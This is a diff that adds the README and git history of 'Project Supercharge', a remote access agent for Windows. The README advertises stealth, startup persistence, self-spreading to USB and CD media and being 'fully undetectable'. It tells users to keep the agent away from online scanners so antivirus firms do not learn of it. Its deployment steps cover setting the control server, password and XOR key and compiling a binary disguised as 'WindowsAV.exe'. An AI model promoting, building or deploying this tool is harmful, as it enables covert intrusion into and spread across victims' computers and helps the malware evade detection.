@@ -1,0 +1,443 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+## Project Supercharge
+
+
+### NOTE
+Do not by any means upload the Agent to online Scanners. Why? Because even if one of the engines finds the file suspicious, the service shares the result among all AV companies, allowing cyber-security firms insight on new types of malware that their engines are not currently detecting. [Read here](https://www.bleepingcomputer.com/news/security/75-percent-of-malware-uploaded-on-no-distribute-scanners-is-unknown-to-researchers/).
+
+![scan_nodistribute](https://github.com/quantumcore/supercharge/blob/master/img/scan.png)
+
+---
+
+Project supercharge is a Remote Access Agent. The supercharge agent is mainly created to provide remote access to a Computer with Stealth and Persistence. 
+
+---
+
+- [Features](#project-supercharge-features)
+- [Installing](#Installing)
+- [Deployment](#Deployment)
+- [Bugs](#Bugs)
+- [Contributing](#Contribute)
+- [Thank you](#thank-you)
+- [Contact](#Contact)
+- [Screenshot](#Screenshot)
+---
+
+### Project Supercharge Features
+Feature | Detail
+---|---
+System Information | View System Information.
+Persistence | Automatically add itself to Startup when first run.
+Stealth | Automatically hide itself to a Location when first run.
+Spreading | If supercharge agent is running and a USB/CD is inserted, The agent will copy itself over into it.
+Message Box | Display a message box.
+Encrypted Connection | Your communication is encrypted with a key of your choice.
+Password Protection | Even though it's encrypted, It will authenticate with a Password hardcoded in the Agent.
+Offline Bot Database | supercharge comes with an Offline Web App you can use to easily view all Agents that ever Connected and when.
+Fully Undetectable | The Agent is fully undetectable. 
+File Upload/Download | Download and upload files.
+Explore | Move around and view files.
+
+
+---
+
+### Installing
+
+##### Prerequisites
+*(NOTE : These are installed by setup script)*
+
+- Mingw cross Compiler
+- Python 3
+
+```bash
+$ git clone https://github.com/quantumcore/supercharge
+$ cd supercharge
+$ sudo ./install.sh
+```
+
+### Note : It can run on Windows, But I recommened a Linux Based OS. (Server side)
+
+
+---
+
+### Deployment
+1. Go to supercharge/agent and open file ``supercharge.hpp`` EG:
+```bash
+nano supercharge.hpp
+```
+2. Edit the Line `SERVER_HOST` and `SERVER_PORT` and the `PASSWORD`. EG:
+```bash
+#define PASSWORD "mysecretpassword" 
+#define SERVER_HOST "127.0.0.1"
+#define SERVER_PORT 3982 
+```
+**Make sure the password is the same you define in ``supercharge.ini``. (Server side)**
+
+3. Go to supercharge/agent and openfile ``xor.cpp`` EG:
+```bash
+nano xor.cpp
+```
+
+4 Edit line (4) which contains the Encryption key. For Example.
+```cpp
+std::string XOR(std::string data) {
+    // Encryption KEY BELOW
+    char key[] = {'M','Y','K','E','Y'};
+    // DONT FORGET TO SET !
+    std::string output = data;
+    
+    for (int i = 0; i < data.size(); i++){
+        output[i] = data[i] ^ key[i % (sizeof(key) / sizeof(char))];
+    }
+    return output;
+}
+```
+5. Compile the Agent
+**On Windows**
+```bash
+make
+```
+**On Linux**
+```bash
+make linux
+```
+
+This will generate the Supercharge agent named ``WindowsAV.exe`` with an ICON.
+
+
+#### Server Side Settings
+1. Setting the Encryption key.
+Open file ``kernel/infodb.py`` in your text editor and edit line 31 to your encryption key. It can be anything.
+For Example. 
+```bash
+$ cd supercharge
+$ nano kernel/infodb.py
+```
+
+```python
+def xor(data):
+    # Encryption KEY! EDIT ME !
+    key = ['M','Y','K','E','Y']
+    # Encryption key ABOVE!
+    output = []
+    for i in range(len(data)):
+        xor_num = ord(data[i]) ^ ord(key[i % len(key)])
+        output.append(chr(xor_num))
+    return ''.join(output)
+```
+
+2. Setting the Password.
+Open file ``supercharge.ini`` and you can just simply change the values.
+
+### Bugs 
+**Fixed**
+- Broken Connection Problems. :heavy_check_mark:
+- Password Authentication buffer overflow. :heavy_check_mark:
+- Remove wchar_t functions (Old code) :heavy_check_mark:
+- File Execution bug. :heavy_check_mark:
+- File Download byte bug. :heavy_check_mark:
+- Windows 10 detected as Windows 8. (Thanks to [@dannyvsdev](https://github.com/dennyvsdev)) :heavy_check_mark:
+- WAN IP Bug.
+
+### Contribute
+If you would like to help me! Please do so! Also, I do not use branches because I always end up pushing to master. So, I always create another repositroy (private) for developement. So if you would like to help me, [Contact](#Contact) me.
+
+### Thank you for bug reporting
+- [dannyvsdev](https://github.com/dennyvsdev)
+- [underg33k](https://github.com/underg33k)
+
+#### TODO :
+- File sorting in the remote file listing. :heavy_check_mark:
+- Imrpovement of the file upload function. :heavy_check_mark:
+- Console Updates. :heavy_check_mark:
+
+### Contact 
+- [Discord](https://discordapp.com/invite/8snh7nx)
+- [Website](https://quantumcore.github.io)
+
+#### Screenshot
+![sample](https://github.com/quantumcore/supercharge/blob/master/img/sample.png)
+====================== GIT HISTORY: ======================
+a68aa86 HEAD@{0}: clone: from https://github.com/quantumcore/supercharge
+commit a68aa86c576dad578c5ee5532ca4c65a1ecc2304
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Mar 11 22:23:57 2020 +0500
+
+    File Download bug fixed, Thanks to @underg33k
+
+commit e3fc05708c45071b8426de14ff165fd9a62af47f
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Mar 11 22:23:17 2020 +0500
+
+    File Download bug fixed, Thanks to @underg33k
+
+commit 59a352a6bf4e0e40bce4c2f2a008b6418cbf3fca
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Mar 11 22:22:44 2020 +0500
+
+    File Download bug fixed, Thanks to @underg33k
+
+commit 019da10810146c24289881e1444756ea2d524376
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Wed Mar 11 21:46:13 2020 +0500
+
+    Update session.py
+
+commit 845b51aa24512f2176cdcbe64803a4b38a1ab3e5
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Wed Mar 11 21:42:57 2020 +0500
+
+    Small change for @underg33k
+
+commit 25c37b438b9a2a1516af8b23e43503f65e4aae98
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Feb 8 22:50:23 2020 +0500
+
+    Update README.md
+
+commit 8fa422467edbfa19cd9f6564bbba4dde1cd76fc7
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Feb 8 22:48:33 2020 +0500
+
+    Update README.md
+
+commit 1a9c2e0f693e569fb5b7b6c08dcae3a68acbe179
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Feb 8 22:47:44 2020 +0500
+
+    Add files via upload
+
+commit 7874e23e6272f9693cf117a2db3977dbb01ccc24
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Feb 8 22:47:22 2020 +0500
+
+    Update README.md
+
+commit 57588076cd0200d819cfee65c2ac6bcecbe5b8f2
+Author: quantumcore <fastcorp11@gmail.com>
+Date:   Sat Feb 8 22:41:24 2020 +0500
+
+    Updates
+
+commit c34976b18c9596406056997f56497e5238d842d5
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Tue Feb 4 01:51:06 2020 +0500
+
+    Update README.md
+
+commit ba073265aaa9bb318935aa971e99deb10f89acda
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Tue Feb 4 01:50:27 2020 +0500
+
+    Update README.md
+
+commit ef57716376c45268b2b2042d74157bb7067659c1
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Tue Feb 4 01:49:58 2020 +0500
+
+    Update README.md
+
+commit 63248968bf1312ae3a983444c5ef4eef748c1cbc
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Tue Feb 4 01:46:00 2020 +0500
+
+    Update README.md
+
+commit 3a65998526bc23e3153273df8e8aaa93b343cd6a
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Wed Jan 15 01:49:59 2020 +0500
+
+    Set theme jekyll-theme-cayman
+
+commit bbb9f74d77813846409a8b6cb097a3c7d7320d7e
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Wed Jan 15 01:47:51 2020 +0500
+
+    Set theme jekyll-theme-hacker
+
+commit de226c2681e1f064b8e4520bbb22d82b7bc6d8bc
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Jan 11 21:01:18 2020 +0500
+
+    Update README.md
+
+commit 8e8c0d359240f636c2a04e776a1ecc2d8d8733ae
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Sat Jan 11 20:59:57 2020 +0500
+
+    Wan ip bug fixed
+
+commit 571421dcd92187d1e5e5f457d2bd76fc8f3f5e96
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Jan 4 16:29:09 2020 +0500
+
+    Update README.md
+
+commit 9c2fbbadce8aa62eb77a941993f5202e94477c12
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Dec 21 18:47:38 2019 +0500
+
+    Update README.md
+
+commit e7fecec62f9fc77f9bd9c64b3ab406ad0f3ac1f1
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Sat Dec 21 18:47:00 2019 +0500
+
+    Update README.md
+
+commit 13910ab5b98785839fded04dc0495280350a1ef2
+Author: Fahad <fahad.mustafa0012@gmail.com>
+Date:   Wed Dec 4 20:17:57 2019 +0500
+
+    kkkk
+
+commit 9d0af4e03d0d9af9fc37577c410f2aee078d485a
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Mon Dec 2 19:15:23 2019 +0500
+
+    Update README.md
+
+commit 5d7f65a82979204a57cfe2811e220cdbdddd2553
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Mon Dec 2 19:14:27 2019 +0500
+
+    Update README.md
+
+commit 1b0dc2c32bf12e467452f7f56d9b8e4d5e972da5
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Mon Dec 2 19:13:52 2019 +0500
+
+    Update README.md
+
+commit d2d86cb7b4fcebfcd179f783b199f33e47c4a7db
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Mon Dec 2 19:10:30 2019 +0500
+
+    add new contributor to list, underg33k
+
+commit 8d1a36fd72082be8539a14f2ca97c6cf4ca3f262
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Sun Dec 1 16:53:56 2019 +0500
+
+    removed tqdm useless import
+
+commit e56e018e2a39ef05d04bf5a07d9b809bbda7eb59
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Fri Nov 29 18:25:18 2019 +0500
+
+    Update README.md
+
+commit 48c5916bd688e94cac51359073662d0c19c09097
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Thu Nov 28 19:54:25 2019 +0500
+
+    Update spmain.py
+
+commit 04891fba227e0b7e2f3790ffe442a625ee0f4ebe
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:55:35 2019 +0500
+
+    Update README.md
+
+commit 2b89ce9b4104f5b20f4b5c42309b572c5c23a3a1
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:54:32 2019 +0500
+
+    Update README.md
+
+commit ff0c99aaf1003e7f258099781a5e4153b21714c1
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:44:44 2019 +0500
+
+    Update README.md
+
+commit de8a04bc09d2d91cd70ae1fec7b600c2612e12b6
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:43:16 2019 +0500
+
+    DB Page bug fixed.
+
+commit fcdb144d6634b4c289019b331d3fc5f99ad5ca3a
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:42:03 2019 +0500
+
+    Windows 10 is now detected, Thanks to @dannyvsdev.
+
+commit 7eaf5234b46441c92b872fc04331a91c9bafda9c
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 26 20:41:23 2019 +0500
+
+    Windows 10 is now detected, Thanks to @dannyvsdev.
+
+commit 40e378d280ad276f12f0c060bc8ee26fad567e0c
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:30:23 2019 +0500
+
+    Update README.md
+
+commit 28781f931186509a68f5000f076e57d537277b9e
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:28:48 2019 +0500
+
+    Update README.md
+
+commit 8c1a71b1ab9540d13b0ca4cf662c44f670040f9a
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:27:52 2019 +0500
+
+    Update README.md
+
+commit 73da62412a48e5561de89e22d4862a8bf93cfe7e
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:26:37 2019 +0500
+
+    Add files via upload
+
+commit 98046261373f17f15b76a3b215dd37b9bdfdee85
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:20:58 2019 +0500
+
+    Update README.md
+
+commit 72253d07cf1e0392cc16901652042ca0763172cc
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:19:23 2019 +0500
+
+    requirements updated
+
+commit 8b3318e4552c9f56184f53ca9e20bcfe428c1671
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:15:00 2019 +0500
+
+    Add files via upload
+
+commit 62cf8471a6b16e6c0af2929dc74aa614f340b0eb
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:14:02 2019 +0500
+
+    README updated
+
+commit 78b6d33823586ceaa99bb152b3654e141412aa1d
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:11:02 2019 +0500
+
+    README updated
+
+commit 0698e0bd42899b064ca1bcb6a75e95a3ef1f1e47
+Author: quantumcore <fahad.mustafa0012@gmail.com>
+Date:   Wed Nov 20 21:10:32 2019 +0500
+
+    README updated
+
+commit be45e785cfbf4efa25c25e98971055f303b6f3a5
+Author: lynxmk <fastcorp11@gmail.com>
+Date:   Tue Nov 19 21:15:48 2019 +0500
+
+    Move Files from repositories.
+
+commit de1513bff003dc15f2de2c512b289920bffedaa1
+Author: Fahad Mustafa <fahad.mustafa0012@gmail.com>
+Date:   Tue Nov 19 20:58:17 2019 +0500
+
+    Initial commit
